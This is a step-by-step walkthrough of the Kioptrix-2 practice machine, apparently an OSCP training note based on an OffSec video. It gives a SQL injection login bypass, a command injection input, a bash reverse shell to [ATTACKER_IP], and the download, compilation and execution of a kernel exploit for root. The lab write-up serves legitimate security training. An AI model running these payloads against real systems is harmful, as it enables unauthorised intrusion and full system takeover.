This walkthrough is based on the **Kioptrix-2 Walkthrough with S1REN** video from OffSec, covering the full penetration testing process from initial information gathering to gaining root access.

## 🎯 Kioptrix-2 OSCP Walkthrough: Comprehensive Notes

***

## I. Information Gathering and Initial Scan

The process starts with a full port scan using Nmap to identify open services and basic system information.

| Command | Purpose & Notes | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- -sV -sC [TARGET_IP] --open` | Full port scan, service version enumeration, and default scripts. **`--open`** speeds up the scan by only listing open ports. | [[31:03](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=1863)] |

### Nmap Findings
The scan identified the target OS as **CentOS** and several key open ports:

* **Port 22 (SSH):** OpenSSH 3.9 (Saved for later, low priority without credentials). [[33:10](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=1990)]
* **Port 80/443 (HTTP/S):** Apache 2.0.52 (High priority for web enumeration). [[33:38](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=2018)]
* **Port 631 (TCP):** CUPS (Common Unix Printing System). [[35:19](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=2119)]
* **Port 3306 (TCP):** MySQL (Service response was "Unauthorized access"). [[35:37](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=2137)]

***

## II. Web Exploitation (Initial Foothold)

### 1. Web Enumeration
The target's web server (Port 80) displays a login page.

* **Manual Inspection (View Source):** Revealed an HTML comment that serves as a potential hint: `start of html when logged in as administrator` [[52:21](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=3141)].
* **Form Details:** The login form submits a `POST` request to `index.php` using parameters like `uname` and `psw`. [[52:06](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=3126)]
* **Directory/File Fuzzing (Wfuzz):** Both HTTP (80) and HTTPS (443) were fuzzed for directories and files using `wfuzz` to identify hidden content, but no immediate findings were returned. [[42:14](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=2534)], [[51:11](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=3071)]
    * ***Wfuzz Syntax Tip:*** Always exclude the response size of 404 pages using `--hc 404` (hide code 404). [[43:58](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=2638)]

### 2. Authentication Bypass (SQL Injection)
The login form was tested for SQL Injection (SQLi) vulnerability.

| Command/Input | Notes | Timestamp |
| :--- | :--- | :--- |
| **Username & Password:** `' or 1=1 -- -` | This payload is designed to evaluate to `TRUE` in the database query, bypassing the need for a valid password. **`-- -`** (or `#`) is a comment in MySQL, ignoring the rest of the query. | [[54:35](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=3275)] |

A successful SQLi bypass leads to an administrative page featuring a **"Ping a machine on the network"** function.

### 3. Command Injection
The "ping" functionality was tested for OS Command Injection (OSCI).

| Command/Input | Notes | Timestamp |
| :--- | :--- | :--- |
| **Ping field input:** `127.0.0.1; id` | The semicolon (`;`) is a command separator, allowing the `id` command to execute after the first command (`ping 127.0.0.1`). | [[01:08:38](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4118)] |

The output confirmed the system is vulnerable to OSCI, with the web server running as the **`apache`** user (`uid=48`).

***

## III. Initial Shell Access (Reverse Shell)

The Command Injection vulnerability is leveraged to execute a reverse shell payload to gain a stable command line interface.

### 1. Attacker (Listening)
| Command | Notes | Timestamp |
| :--- | :--- | :--- |
| `nc -nlvp 9090` | Sets up a Netcat listener on port **9090** (the video uses this as a preferred port). | [[01:12:23](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4343)] |

### 2. Victim (Execution via Burp Repeater)
The shell payload is inserted into the `ip` parameter and **URL-encoded** to ensure special characters are transmitted correctly.

| Command/Input | Notes | Timestamp |
| :--- | :--- | :--- |
| **IP Parameter:** `127.0.0.1; bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/9090 0>&1'` | A standard Bash reverse shell payload. | [[01:11:10](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4270)] |

* **Crucial Step:** When testing in Burp Repeater, the **`Content-Length`** header must be correctly adjusted (or toggled by changing the request type from `POST` to `GET` and back) to match the new size of the payload. [[01:13:03](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4383)]

### 3. Shell Stabilization
Upon getting the shell, it must be stabilized for better usability.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `export TERM=xterm-256color` | Sets the terminal environment. | [[01:14:18](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4458)] |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Spawns a proper TTY shell. | [[01:14:26](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4466)] |
| `stty -echo` (after Ctrl+Z, `fg`) | Makes the shell more stable and hides input. | [[01:15:09](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4509)] |

***

## IV. Privilege Escalation

The goal is to move from the low-privileged `apache` user to the `root` user.

### 1. Local Enumeration

| Command | Finding/Purpose | Timestamp |
| :--- | :--- | :--- |
| `uname -a` | **Kernel:** `2.6.9-55.EL` (Linux 2.6 series, a common target for kernel exploits). | [[01:16:05](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4565)] |
| `cat /etc/redhat-release` | **OS:** `CentOS release 4.5 (Final)`. | [[01:16:10](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=4570)] |
| `netstat -antup` | **Local Services:** MySQL on **3306** and Sendmail on **25** are listening on the loopback adapter (`127.0.0.1`). | [[01:25:59](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5159)] |
| `cat index.php` | **MySQL Credentials:** Found in the web application source code: **User `john`, Pass `hiroshima`**. | [[01:28:44](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5324)] |
| `mysql -u john -p hiroshima` | **Database Access:** Logged into MySQL. | [[01:29:28](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5368)] |
| `show databases; use webapp; select * from users;` | **Database Dump:** Found additional user credentials, but they did not work for password reuse on SSH or `su`. | [[01:29:43](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5383)] |

### 2. Kernel Exploitation

Based on the Kernel and OS version (`Linux 2.6.9` / `CentOS 4.5`), the path chosen is a known kernel exploit.

| Command | Notes | Timestamp |
| :--- | :--- | :--- |
| **Attacker:** `searchsploit linux kernel 2.6 centos 4.5 local` | Finds exploit **9542.c** (CentOS 4.5 / RHEL 4.5 kernel 2.6). | [[01:37:05](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5825)] |
| **Attacker:** `searchsploit -m 9542.c` | Copies the exploit locally. | [[01:38:34](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5914)] |
| **Attacker:** `python -m SimpleHTTPServer 8000` | Sets up a temporary web server to transfer the file. | [[01:39:55](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=5995)] |
| **Victim:** `cd /dev/shm` | Moves to a world-writable directory for file transfer and compilation. | [[01:40:01](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=6001)] |
| **Victim:** `wget http://[ATTACKER_IP]:8000/9542.c -O offset.c` | Downloads the exploit file. | [[01:40:22](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=6022)] |
| **Victim:** `gcc offset.c -o offset` | Compiles the C exploit using the available GCC compiler. | [[01:43:18](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=6198)] |
| **Victim:** `./offset` | **EXECUTES THE EXPLOIT**, resulting in a root shell. | [[01:43:57](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=6237)] |

Final access is achieved as **`root`** (`uid=0(root)`). [[01:44:16](http://www.youtube.com/watch?v=ALSsY5Ru32k&t=6256)]
http://googleusercontent.com/youtube_content/0